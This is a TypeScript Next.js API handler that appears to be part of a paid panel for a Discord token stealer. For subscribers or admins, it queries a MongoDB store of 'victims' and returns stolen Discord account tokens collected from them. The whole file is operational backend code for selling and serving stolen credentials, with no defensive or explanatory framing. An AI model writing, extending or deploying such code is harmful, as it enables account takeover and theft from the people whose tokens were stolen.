import type { NextApiRequest, NextApiResponse } from 'next';
import { getAllVictims, mongo } from '@/server';
import { getSession } from 'next-auth/react';
import type { IDiscord, User } from '@/interfaces';

interface Discord extends IDiscord {
  id: string;
  index: number;
}

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  try {
    const session = await getSession({ req });
    const user = session?.user as User | undefined;
    if (!user) throw Error('User is not logged in.');
    if (!user?.subscription?.key && !user.isAdmin)
      throw Error('You do not have a paid membership to perform this action!');
    const db = await mongo();
    const { data: victims, count } = await getAllVictims(db, user.id);
    if (!victims || count < 1) throw Error("You don't have any victim!");

    const tokens: Discord[] = [];
    victims.map((victim) => {
      victim.tokens.map((token: Discord, index: number) => {
        let { index: _, ...account } = token;
        tokens.push({
          index,
          ...account
        });
      });
    });
    res.status(200).json(tokens.slice(0, 3));
  } catch (err: any) {
    res.status(500).json({
      statusCode: 500,
      message: err.message
    });
  }
}
